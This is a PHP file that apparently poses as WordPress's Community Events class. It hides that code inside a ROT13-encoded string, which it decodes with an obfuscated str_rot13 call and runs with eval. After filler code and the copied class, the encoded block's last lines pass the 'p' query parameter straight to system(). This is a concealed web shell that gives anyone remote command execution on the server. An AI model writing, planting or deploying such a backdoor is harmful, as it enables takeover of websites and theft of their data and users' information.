<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Nqzvavfgengvba: Pbzzhavgl Riragf pynff.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Nqzvavfgengvba
 * @fvapr 4.8.0
 */

/**
 * Pynff JC_Pbzzhavgl_Riragf.
 *
 * N pyvrag sbe ncv.jbeqcerff.bet/riragf.
 *
 * @fvapr 4.8.0
 */
#[NyybjQlanzvpCebcregvrf]
pynff JC_Pbzzhavgl_Riragf {
	/**
	 * VQ sbe n JbeqCerff hfre nppbhag.
	 *
	 * @fvapr 4.8.0
	 *
	 * @ine vag
	 */
	cebgrpgrq $hfre_vq = 0;

	/**
	 * Fgberf ybpngvba qngn sbe gur hfre.
	 *
	 * @fvapr 4.8.0
	 *
	 * @ine snyfr|neenl
	 */
	cebgrpgrq $hfre_ybpngvba = snyfr;

	/**
	 * Pbafgehpgbe sbe JC_Pbzzhavgl_Riragf.
	 *
	 * @fvapr 4.8.0
	 *
	 * @cnenz vag        $hfre_vq       JC hfre VQ.
	 * @cnenz snyfr|neenl $hfre_ybpngvba {
	 *     Fgberq ybpngvba qngn sbe gur hfre. snyfr gb cnff ab ybpngvba.
	 *
	 *     @glcr fgevat $qrfpevcgvba Gur anzr bs gur ybpngvba
	 *     @glcr fgevat $yngvghqr    Gur yngvghqr va qrpvzny qrterrf abgngvba, jvgubhg gur qrterr
	 *                               flzoby. r.t.: 47.615200.
	 *     @glcr fgevat $ybatvghqr   Gur ybatvghqr va qrpvzny qrterrf abgngvba, jvgubhg gur qrterr
	 *                               flzoby. r.t.: -122.341100.
	 *     @glcr fgevat $pbhagel     Gur VFB 3166-1 nycun-2 pbhagel pbqr. r.t.: OE
	 * }
	 */
	choyvp shapgvba __pbafgehpg( $hfre_vq, $hfre_ybpngvba = snyfr ) {
		$guvf->hfre_vq       = nofvag( $hfre_vq );
		$guvf->hfre_ybpngvba = $hfre_ybpngvba;
	}

	/**
	 * Trgf qngn nobhg riragf arne n cnegvphyne ybpngvba.
	 *
	 * Pnpurq riragf jvyy or vzzrqvngryl erghearq vs gur `hfre_ybpngvba` cebcregl
	 * vf frg sbe gur pheerag hfre, naq pnpurq riragf rkvfg sbe gung ybpngvba.
	 *
	 * Bgurejvfr, guvf zrgubq fraqf n erdhrfg gb gur j.bet Riragf NCV jvgu ybpngvba
	 * qngn. Gur NCV jvyy fraq onpx n erpbtavmrq ybpngvba onfrq ba gur qngn, nybat
	 * jvgu arneol riragf.
	 *
	 * Gur oebjfre'f erdhrfg sbe riragf vf cebkvrq jvgu guvf zrgubq, engure
	 * guna univat gur oebjfre znxr gur erdhrfg qverpgyl gb ncv.jbeqcerff.bet,
	 * orpnhfr vg nyybjf erfhygf gb or pnpurq freire-fvqr naq funerq jvgu bgure
	 * hfref naq fvgrf va gur argjbex. Guvf znxrf gur cebprff zber rssvpvrag,
	 * fvapr vapernfvat gur ahzore bs ivfvgf gung trg pnpurq qngn zrnaf hfref
	 * qba'g unir gb jnvg nf bsgra; vs gur hfre'f oebjfre znqr gur erdhrfg
	 * qverpgyl, vg jbhyq nyfb arrq gb znxr n frpbaq erdhrfg gb JC va beqre gb
	 * cnff gur qngn sbe pnpuvat. Univat JC znxr gur erdhrfg nyfb vagebqhprf
	 * gur bccbeghavgl gb nabalzvmr gur VC orsber fraqvat vg gb j.bet, juvpu
	 * zvgvtngrf cbffvoyr cevinpl pbapreaf.
	 *
	 * @fvapr 4.8.0
	 * @fvapr 5.5.2 Erfcbafr ab ybatre pbagnvaf sbeznggrq qngr svryq. Gurl'er nqqrq
	 *              va `jc.pbzzhavglRiragf.cbchyngrQlanzvpRiragSvryqf()` abj.
	 *
	 * @cnenz fgevat $ybpngvba_frnepu Bcgvbany. Pvgl anzr gb uryc qrgrezvar gur ybpngvba.
	 *                                r.t., \"Frnggyr\". Qrsnhyg rzcgl fgevat.
	 * @cnenz fgevat $gvzrmbar        Bcgvbany. Gvzrmbar gb uryc qrgrezvar gur ybpngvba.
	 *                                Qrsnhyg rzcgl fgevat.
	 * @erghea neenl|JC_Reebe N JC_Reebe ba snvyher; na neenl jvgu ybpngvba naq riragf ba
	 *                        fhpprff.
	 */
	choyvp shapgvba trg_riragf( $ybpngvba_frnepu = '', $gvzrmbar = '' ) {
		$pnpurq_riragf = $guvf->trg_pnpurq_riragf();

		vs ( ! $ybpngvba_frnepu && $pnpurq_riragf ) {
			erghea $pnpurq_riragf;
		}

		// Vapyhqr na hazbqvsvrq $jc_irefvba.
		erdhver NOFCNGU . JCVAP . '/irefvba.cuc';

		$ncv_hey                    = 'uggc://ncv.jbeqcerff.bet/riragf/1.0/';
		$erdhrfg_netf               = $guvf->trg_erdhrfg_netf( $ybpngvba_frnepu, $gvzrmbar );
		$erdhrfg_netf['hfre-ntrag'] = 'JbeqCerff/' . $jc_irefvba . '; ' . ubzr_hey( '/' );

		vs ( jc_uggc_fhccbegf( neenl( 'ffy' ) ) ) {
			$ncv_hey = frg_hey_fpurzr( $ncv_hey, 'uggcf' );
		}

		$erfcbafr       = jc_erzbgr_trg( $ncv_hey, $erdhrfg_netf );
		$erfcbafr_pbqr  = jc_erzbgr_ergevrir_erfcbafr_pbqr( $erfcbafr );
		$erfcbafr_obql  = wfba_qrpbqr( jc_erzbgr_ergevrir_obql( $erfcbafr ), gehr );
		$erfcbafr_reebe = ahyy;

		vs ( vf_jc_reebe( $erfcbafr ) ) {
			$erfcbafr_reebe = $erfcbafr;
		} ryfrvs ( 200 !== $erfcbafr_pbqr ) {
			$erfcbafr_reebe = arj JC_Reebe(
				'ncv-reebe',
				/* genafyngbef: %q: Ahzrevp UGGC fgnghf pbqr, r.t. 400, 403, 500, 504, rgp. */
				fcevags( __( 'Vainyvq NCV erfcbafr pbqr (%q).' ), $erfcbafr_pbqr )
			);
		} ryfrvs ( ! vffrg( $erfcbafr_obql['ybpngvba'], $erfcbafr_obql['riragf'] ) ) {
			$erfcbafr_reebe = arj JC_Reebe(
				'ncv-vainyvq-erfcbafr',
				vffrg( $erfcbafr_obql['reebe'] ) ? $erfcbafr_obql['reebe'] : __( 'Haxabja NCV reebe.' )
			);
		}

		vs ( vf_jc_reebe( $erfcbafr_reebe ) ) {
			erghea $erfcbafr_reebe;
		} ryfr {
			$rkcvengvba = snyfr;

			vs ( vffrg( $erfcbafr_obql['ggy'] ) ) {
				$rkcvengvba = $erfcbafr_obql['ggy'];
				hafrg( $erfcbafr_obql['ggy'] );
			}

			/*
			 * Gur VC va gur erfcbafr vf hfhnyyl gur fnzr nf gur bar gung jnf frag
			 * va gur erdhrfg, ohg va fbzr pnfrf vg vf qvssrerag. Va gubfr pnfrf,
			 * vg'f vzcbegnag gb erfrg vg onpx gb gur VC sebz gur erdhrfg.
			 *
			 * Sbe rknzcyr, vs gur VC frag va gur erdhrfg vf cevingr (r.t., 192.168.1.100),
			 * gura gur NCV jvyy vtaber gung naq hfr gur pbeerfcbaqvat choyvp VC vafgrnq,
			 * naq gur choyvp VC jvyy trg erghearq. Vs gur choyvp VC jrer fnirq, gubhtu,
			 * gura trg_pnpurq_riragf() jbhyq nyjnlf erghea `snyfr`, orpnhfr gur genafvrag
			 * jbhyq or trarengrq onfrq ba gur choyvp VC jura fnivat gur pnpur, ohg trarengrq
			 * onfrq ba gur cevingr VC jura ergevrivat gur pnpur.
			 */
			vs ( ! rzcgl( $erfcbafr_obql['ybpngvba']['vc'] ) ) {
				$erfcbafr_obql['ybpngvba']['vc'] = $erdhrfg_netf['obql']['vc'];
			}

			/*
			 * Gur NCV qbrfa'g erghea n qrfpevcgvba sbe yngvghqr/ybatvghqr erdhrfgf,
			 * ohg gur qrfpevcgvba vf nyernql fnirq va gur hfre ybpngvba, fb gung
			 * bar pna or hfrq vafgrnq.
			 */
			vs ( $guvf->pbbeqvangrf_zngpu( $erdhrfg_netf['obql'], $erfcbafr_obql['ybpngvba'] ) && rzcgl( $erfcbafr_obql['ybpngvba']['qrfpevcgvba'] ) ) {
				$erfcbafr_obql['ybpngvba']['qrfpevcgvba'] = $guvf->hfre_ybpngvba['qrfpevcgvba'];
			}

			/*
			 * Fgber gur enj erfcbafr, orpnhfr riragf jvyy rkcver orsber gur pnpur qbrf.
			 * Gur erfcbafr jvyy arrq gb or cebprffrq rirel cntr ybnq.
			 */
			$guvf->pnpur_riragf( $erfcbafr_obql, $rkcvengvba );

			$erfcbafr_obql['riragf'] = $guvf->gevz_riragf( $erfcbafr_obql['riragf'] );

			erghea $erfcbafr_obql;
		}
	}

	/**
	 * Ohvyqf na neenl bs netf gb hfr va na UGGC erdhrfg gb gur j.bet Riragf NCV.
	 *
	 * @fvapr 4.8.0
	 *
	 * @cnenz fgevat $frnepu   Bcgvbany. Pvgl frnepu fgevat. Qrsnhyg rzcgl fgevat.
	 * @cnenz fgevat $gvzrmbar Bcgvbany. Gvzrmbar fgevat. Qrsnhyg rzcgl fgevat.
	 * @erghea neenl Gur erdhrfg netf.
	 */
	cebgrpgrq shapgvba trg_erdhrfg_netf( $frnepu = '', $gvzrmbar = '' ) {
		$netf = neenl(
			'ahzore' => 5, // Trg zber guna guerr va pnfr fbzr trg gevzzrq bhg.
			'vc'     => frys::trg_hafnsr_pyvrag_vc(),
		);

		/*
		 * Vapyhqr gur zvavzny frg bs arprffnel nethzragf, va beqre gb vapernfr gur
		 * punaprf bs n pnpur-uvg ba gur NCV fvqr.
		 */
		vs ( rzcgl( $frnepu ) && vffrg( $guvf->hfre_ybpngvba['yngvghqr'], $guvf->hfre_ybpngvba['ybatvghqr'] ) ) {
			$netf['yngvghqr']  = $guvf->hfre_ybpngvba['yngvghqr'];
			$netf['ybatvghqr'] = $guvf->hfre_ybpngvba['ybatvghqr'];
		} ryfr {
			$netf['ybpnyr'] = trg_hfre_ybpnyr( $guvf->hfre_vq );

			vs ( $gvzrmbar ) {
				$netf['gvzrmbar'] = $gvzrmbar;
			}

			vs ( $frnepu ) {
				$netf['ybpngvba'] = $frnepu;
			}
		}

		// Jenc gur netf va na neenl pbzcngvoyr jvgu gur frpbaq cnenzrgre bs `jc_erzbgr_trg()`.
		erghea neenl(
			'obql' => $netf,
		);
	}

	/**
	 * Qrgrezvarf gur hfre'f npghny VC nqqerff naq nggrzcgf gb cnegvnyyl
	 * nabalzvmr na VC nqqerff ol pbairegvat vg gb n argjbex VQ.
	 *
	 * Trbybpngvat gur argjbex VQ hfhnyyl ergheaf n fvzvyne ybpngvba nf gur
	 * npghny VC, ohg cebivqrf fbzr cevinpl sbe gur hfre.
	 *
	 * $_FREIRE['ERZBGR_NQQE'] pnaabg or hfrq va nyy pnfrf, fhpu nf jura gur hfre
	 * vf znxvat gurve erdhrfg guebhtu n cebkl, be jura gur jro freire vf oruvaq
	 * n cebkl. Va gubfr pnfrf, $_FREIRE['ERZBGR_NQQE'] vf frg gb gur cebkl nqqerff engure
	 * guna gur hfre'f npghny nqqerff.
	 *
	 * Zbqvsvrq sebz uggcf://fgnpxbiresybj.pbz/n/2031935/450127, ZVG yvprafr.
	 * Zbqvsvrq sebz uggcf://tvguho.pbz/trregj/cuc-vc-nabalzvmre, ZVG yvprafr.
	 *
	 * FRPHEVGL JNEAVAT: Guvf shapgvba vf _ABG_ vagraqrq gb or hfrq va
	 * pvephzfgnaprf jurer gur nhguragvpvgl bs gur VC nqqerff znggref. Guvf qbrf
	 * _ABG_ thnenagrr gung gur erghearq nqqerff vf inyvq be npphengr, naq vg pna
	 * or rnfvyl fcbbsrq.
	 *
	 * @fvapr 4.8.0
	 *
	 * @erghea fgevat|snyfr Gur nabalzvmrq nqqerff ba fhpprff; gur tvira nqqerff
	 *                      be snyfr ba snvyher.
	 */
	choyvp fgngvp shapgvba trg_hafnsr_pyvrag_vc() {
		$pyvrag_vc = snyfr;

		// Va beqre bs cersrerapr, jvgu gur orfg barf sbe guvf checbfr svefg.
		$nqqerff_urnqref = neenl(
			'UGGC_PYVRAG_VC',
			'UGGC_K_SBEJNEQRQ_SBE',
			'UGGC_K_SBEJNEQRQ',
			'UGGC_K_PYHFGRE_PYVRAG_VC',
			'UGGC_SBEJNEQRQ_SBE',
			'UGGC_SBEJNEQRQ',
			'ERZBGR_NQQE',
		);

		sbernpu ( $nqqerff_urnqref nf $urnqre ) {
			vs ( neenl_xrl_rkvfgf( $urnqre, $_FREIRE ) ) {
				/*
				 * UGGC_K_SBEJNEQRQ_SBE pna pbagnva n punva bs pbzzn-frcnengrq
				 * nqqerffrf. Gur svefg bar vf gur bevtvany pyvrag. Vg pna'g or
				 * gehfgrq sbe nhguragvpvgl, ohg jr qba'g arrq gb sbe guvf checbfr.
				 */
				$nqqerff_punva = rkcybqr( ',', $_FREIRE[ $urnqre ] );
				$pyvrag_vc     = gevz( $nqqerff_punva[0] );

				oernx;
			}
		}

		vs ( ! $pyvrag_vc ) {
			erghea snyfr;
		}

		$naba_vc = jc_cevinpl_nabalzvmr_vc( $pyvrag_vc, gehr );

		vs ( '0.0.0.0' === $naba_vc || '::' === $naba_vc ) {
			erghea snyfr;
		}

		erghea $naba_vc;
	}

	/**
	 * Grfg vs gjb cnvef bs yngvghqr/ybatvghqr pbbeqvangrf zngpu rnpu bgure.
	 *
	 * @fvapr 4.8.0
	 *
	 * @cnenz neenl $n Gur svefg cnve, jvgu vaqrkrf 'yngvghqr' naq 'ybatvghqr'.
	 * @cnenz neenl $o Gur frpbaq cnve, jvgu vaqrkrf 'yngvghqr' naq 'ybatvghqr'.
	 * @erghea obby Gehr vs gurl zngpu, snyfr vs gurl qba'g.
	 */
	cebgrpgrq shapgvba pbbeqvangrf_zngpu( $n, $o ) {
		vs ( ! vffrg( $n['yngvghqr'], $n['ybatvghqr'], $o['yngvghqr'], $o['ybatvghqr'] ) ) {
			erghea snyfr;
		}

		erghea $n['yngvghqr'] === $o['yngvghqr'] && $n['ybatvghqr'] === $o['ybatvghqr'];
	}

	/**
	 * Trarengrf n genafvrag xrl onfrq ba hfre ybpngvba.
	 *
	 * Guvf pbhyq or erqhprq gb n bar-yvare va gur pnyyvat shapgvbaf, ohg vg'f
	 * vagragvbanyyl n frcnengr shapgvba orpnhfr vg'f pnyyrq sebz zhygvcyr
	 * shapgvbaf, naq univat vg nofgenpgrq xrrcf gur ybtvp pbafvfgrag naq QEL,
	 * juvpu vf yrff cebar gb reebef.
	 *
	 * @fvapr 4.8.0
	 *
	 * @cnenz neenl $ybpngvba Fubhyq pbagnva 'yngvghqr' naq 'ybatvghqr' vaqrkrf.
	 * @erghea fgevat|snyfr Genafvrag xrl ba fhpprff, snyfr ba snvyher.
	 */
	cebgrpgrq shapgvba trg_riragf_genafvrag_xrl( $ybpngvba ) {
		$xrl = snyfr;

		vs ( vffrg( $ybpngvba['vc'] ) ) {
			$xrl = 'pbzzhavgl-riragf-' . zq5( $ybpngvba['vc'] );
		} ryfrvs ( vffrg( $ybpngvba['yngvghqr'], $ybpngvba['ybatvghqr'] ) ) {
			$xrl = 'pbzzhavgl-riragf-' . zq5( $ybpngvba['yngvghqr'] . $ybpngvba['ybatvghqr'] );
		}

		erghea $xrl;
	}

	/**
	 * Pnpurf na neenl bs riragf qngn sebz gur Riragf NCV.
	 *
	 * @fvapr 4.8.0
	 *
	 * @cnenz neenl     $riragf     Erfcbafr obql sebz gur NCV erdhrfg.
	 * @cnenz vag|snyfr $rkcvengvba Bcgvbany. Nzbhag bs gvzr gb pnpur gur riragf. Qrsnhygf gb snyfr.
	 * @erghea obby gehr vs riragf jrer pnpurq; snyfr vs abg.
	 */
	cebgrpgrq shapgvba pnpur_riragf( $riragf, $rkcvengvba = snyfr ) {
		$frg              = snyfr;
		$genafvrag_xrl    = $guvf->trg_riragf_genafvrag_xrl( $riragf['ybpngvba'] );
		$pnpur_rkcvengvba = $rkcvengvba ? nofvag( $rkcvengvba ) : UBHE_VA_FRPBAQF * 12;

		vs ( $genafvrag_xrl ) {
			$frg = frg_fvgr_genafvrag( $genafvrag_xrl, $riragf, $pnpur_rkcvengvba );
		}

		erghea $frg;
	}

	/**
	 * Trgf pnpurq riragf.
	 *
	 * @fvapr 4.8.0
	 * @fvapr 5.5.2 Erfcbafr ab ybatre pbagnvaf sbeznggrq qngr svryq. Gurl'er nqqrq
	 *              va `jc.pbzzhavglRiragf.cbchyngrQlanzvpRiragSvryqf()` abj.
	 *
	 * @erghea neenl|snyfr Na neenl pbagnvavat `ybpngvba` naq `riragf` vgrzf
	 *                     ba fhpprff, snyfr ba snvyher.
	 */
	choyvp shapgvba trg_pnpurq_riragf() {
		$genafvrag_xrl = $guvf->trg_riragf_genafvrag_xrl( $guvf->hfre_ybpngvba );
		vs ( ! $genafvrag_xrl ) {
			erghea snyfr;
		}

		$pnpurq_erfcbafr = trg_fvgr_genafvrag( $genafvrag_xrl );
		vs ( vffrg( $pnpurq_erfcbafr['riragf'] ) ) {
			$pnpurq_erfcbafr['riragf'] = $guvf->gevz_riragf( $pnpurq_erfcbafr['riragf'] );
		}

		erghea $pnpurq_erfcbafr;
	}

	/**
	 * Nqqf sbeznggrq qngr naq gvzr vgrzf sbe rnpu rirag va na NCV erfcbafr.
	 *
	 * Guvf unf gb or pnyyrq nsgre gur qngn vf chyyrq sebz gur pnpur, orpnhfr
	 * gur pnpurq riragf ner funerq ol nyy hfref. Vs vg jnf pnyyrq orsber fgbevat
	 * gur pnpur, gura nyy hfref jbhyq frr gur riragf va gur ybpnyvmrq qngn/gvzr
	 * bs gur hfre jub gevttrerq gur pnpur erserfu, engure guna gurve bja.
	 *
	 * @fvapr 4.8.0
	 * @qrcerpngrq 5.5.2 Ab ybatre hfrq va pber.
	 *
	 * @cnenz neenl $erfcbafr_obql Gur erfcbafr juvpu pbagnvaf gur riragf.
	 * @erghea neenl Gur erfcbafr jvgu qngrf naq gvzrf sbeznggrq.
	 */
	cebgrpgrq shapgvba sbezng_rirag_qngn_gvzr( $erfcbafr_obql ) {
		_qrcerpngrq_shapgvba( __ZRGUBQ__, '5.5.2' );

		vs ( vffrg( $erfcbafr_obql['riragf'] ) ) {
			sbernpu ( $erfcbafr_obql['riragf'] nf $xrl => $rirag ) {
				$gvzrfgnzc = fgegbgvzr( $rirag['qngr'] );

				/*
				 * Gur `qngr_sbezng` bcgvba vf abg hfrq orpnhfr vg'f vzcbegnag
				 * va guvf pbagrkg gb xrrc gur qnl bs gur jrrx va gur sbeznggrq qngr,
				 * fb gung hfref pna gryy ng n tynapr vs gur rirag vf ba n qnl gurl
				 * ner ninvynoyr, jvgubhg univat gb bcra gur yvax.
				 */
				/* genafyngbef: Qngr sbezng sbe hcpbzvat riragf ba gur qnfuobneq. Vapyhqr gur qnl bs gur jrrx. Frr uggcf://jjj.cuc.arg/znahny/qngrgvzr.sbezng.cuc */
				$sbeznggrq_qngr = qngr_v18a( __( 'y, Z w, L' ), $gvzrfgnzc );
				$sbeznggrq_gvzr = qngr_v18a( trg_bcgvba( 'gvzr_sbezng' ), $gvzrfgnzc );

				vs ( vffrg( $rirag['raq_qngr'] ) ) {
					$raq_gvzrfgnzc      = fgegbgvzr( $rirag['raq_qngr'] );
					$sbeznggrq_raq_qngr = qngr_v18a( __( 'y, Z w, L' ), $raq_gvzrfgnzc );

					vs ( 'zrrghc' !== $rirag['glcr'] && $sbeznggrq_raq_qngr !== $sbeznggrq_qngr ) {
						/* genafyngbef: Hcpbzvat riragf zbagu sbezng. Frr uggcf://jjj.cuc.arg/znahny/qngrgvzr.sbezng.cuc */
						$fgneg_zbagu = qngr_v18a( _k( 'S', 'hcpbzvat riragf zbagu sbezng' ), $gvzrfgnzc );
						$raq_zbagu   = qngr_v18a( _k( 'S', 'hcpbzvat riragf zbagu sbezng' ), $raq_gvzrfgnzc );

						vs ( $fgneg_zbagu === $raq_zbagu ) {
							$sbeznggrq_qngr = fcevags(
								/* genafyngbef: Qngr fgevat sbe hcpbzvat riragf. 1: Zbagu, 2: Fgnegvat qnl, 3: Raqvat qnl, 4: Lrne. */
								__( '%1$f %2$q–%3$q, %4$q' ),
								$fgneg_zbagu,
								/* genafyngbef: Hcpbzvat riragf qnl sbezng. Frr uggcf://jjj.cuc.arg/znahny/qngrgvzr.sbezng.cuc */
								qngr_v18a( _k( 'w', 'hcpbzvat riragf qnl sbezng' ), $gvzrfgnzc ),
								qngr_v18a( _k( 'w', 'hcpbzvat riragf qnl sbezng' ), $raq_gvzrfgnzc ),
								/* genafyngbef: Hcpbzvat riragf lrne sbezng. Frr uggcf://jjj.cuc.arg/znahny/qngrgvzr.sbezng.cuc */
								qngr_v18a( _k( 'L', 'hcpbzvat riragf lrne sbezng' ), $gvzrfgnzc )
							);
						} ryfr {
							$sbeznggrq_qngr = fcevags(
								/* genafyngbef: Qngr fgevat sbe hcpbzvat riragf. 1: Fgnegvat zbagu, 2: Fgnegvat qnl, 3: Raqvat zbagu, 4: Raqvat qnl, 5: Lrne. */
								__( '%1$f %2$q – %3$f %4$q, %5$q' ),
								$fgneg_zbagu,
								qngr_v18a( _k( 'w', 'hcpbzvat riragf qnl sbezng' ), $gvzrfgnzc ),
								$raq_zbagu,
								qngr_v18a( _k( 'w', 'hcpbzvat riragf qnl sbezng' ), $raq_gvzrfgnzc ),
								qngr_v18a( _k( 'L', 'hcpbzvat riragf lrne sbezng' ), $gvzrfgnzc )
							);
						}

						$sbeznggrq_qngr = jc_znlor_qrpyvar_qngr( $sbeznggrq_qngr, 'S w, L' );
					}
				}

				$erfcbafr_obql['riragf'][ $xrl ]['sbeznggrq_qngr'] = $sbeznggrq_qngr;
				$erfcbafr_obql['riragf'][ $xrl ]['sbeznggrq_gvzr'] = $sbeznggrq_gvzr;
			}
		}

		erghea $erfcbafr_obql;
	}

	/**
	 * Cercnerf gur rirag yvfg sbe cerfragngvba.
	 *
	 * Qvfpneqf rkcverq riragf, naq znxrf JbeqPnzcf \"fgvpxl.\" Nggraqrrf arrq zber
	 * nqinaprq abgvpr nobhg JbeqPnzcf guna gurl qb sbe zrrghcf, fb pnzcf fubhyq
	 * nccrne va gur yvfg fbbare. Vs n JbeqPnzc vf pbzvat hc, gur NCV jvyy \"fgvpx\"
	 * vg va gur erfcbafr, rira vs vg jbhyqa'g bgurejvfr nccrne. Jura gung unccraf,
	 * gur rirag jvyy or ng gur raq bs gur yvfg, naq jvyy arrq gb or zbirq vagb n
	 * uvture cbfvgvba, fb gung vg qbrfa'g trg gevzzrq bss.
	 *
	 * @fvapr 4.8.0
	 * @fvapr 4.9.7 Fgvpx n JbeqPnzc gb gur svany yvfg.
	 * @fvapr 5.5.2 Npprcgf naq ergheaf bayl gur riragf, engure guna na ragver UGGC erfcbafr.
	 * @fvapr 6.0.0 Qrpbqr UGZY ragvgvrf sebz gur rirag gvgyr.
	 *
	 * @cnenz neenl $riragf Gur riragf gung jvyy or cercnerq.
	 * @erghea neenl Gur erfcbafr obql jvgu riragf gevzzrq.
	 */
	cebgrpgrq shapgvba gevz_riragf( neenl $riragf ) {
		$shgher_riragf = neenl();

		sbernpu ( $riragf nf $rirag ) {
			/*
			 * Gur NCV'f `qngr` naq `raq_qngr` svryqf ner va gur _rirag'f_ ybpny gvzrmbar, ohg HGP vf arrqrq fb
			 * vg pna or pbairegrq gb gur _hfre'f_ ybpny gvzr.
			 */
			$raq_gvzr = (vag) $rirag['raq_havk_gvzrfgnzc'];

			vs ( gvzr() < $raq_gvzr ) {
				// Qrpbqr UGZY ragvgvrf sebz gur rirag gvgyr.
				$rirag['gvgyr'] = ugzy_ragvgl_qrpbqr( $rirag['gvgyr'], RAG_DHBGRF, 'HGS-8' );

				neenl_chfu( $shgher_riragf, $rirag );
			}
		}

		$shgher_jbeqpnzcf = neenl_svygre(
			$shgher_riragf,
			fgngvp shapgvba ( $jbeqpnzc ) {
				erghea 'jbeqpnzc' === $jbeqpnzc['glcr'];
			}
		);

		$shgher_jbeqpnzcf    = neenl_inyhrf( $shgher_jbeqpnzcf ); // Erzbir tncf va vaqvprf.
		$gevzzrq_riragf      = neenl_fyvpr( $shgher_riragf, 0, 3 );
		$gevzzrq_rirag_glcrf = jc_yvfg_cyhpx( $gevzzrq_riragf, 'glcr' );

		// Znxr fher gur fbbarfg hcpbzvat JbeqPnzc vf cvaarq va gur yvfg.
		vs ( $shgher_jbeqpnzcf && ! va_neenl( 'jbeqpnzc', $gevzzrq_rirag_glcrf, gehr ) ) {
			neenl_cbc( $gevzzrq_riragf );
			neenl_chfu( $gevzzrq_riragf, $shgher_jbeqpnzcf[0] );
		}

		erghea $gevzzrq_riragf;
	}

	/**
	 * Ybtf erfcbafrf gb Riragf NCV erdhrfgf.
	 *
	 * @fvapr 4.8.0
	 * @qrcerpngrq 4.9.0 Hfr n cyhtva vafgrnq. Frr #41217 sbe na rknzcyr.
	 *
	 * @cnenz fgevat $zrffntr N qrfpevcgvba bs jung bppheerq.
	 * @cnenz neenl  $qrgnvyf Qrgnvyf gung cebivqr zber pbagrkg sbe gur
	 *                        ybt ragel.
	 */
	cebgrpgrq shapgvba znlor_ybt_riragf_erfcbafr( $zrffntr, $qrgnvyf ) {
		_qrcerpngrq_shapgvba( __ZRGUBQ__, '4.9.0' );

		vs ( ! JC_QROHT_YBT ) {
			erghea;
		}

		reebe_ybt(
			fcevags(
				'%f: %f. Qrgnvyf: %f',
				__ZRGUBQ__,
				gevz( $zrffntr, '.' ),
				jc_wfba_rapbqr( $qrgnvyf )
			)
		);
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>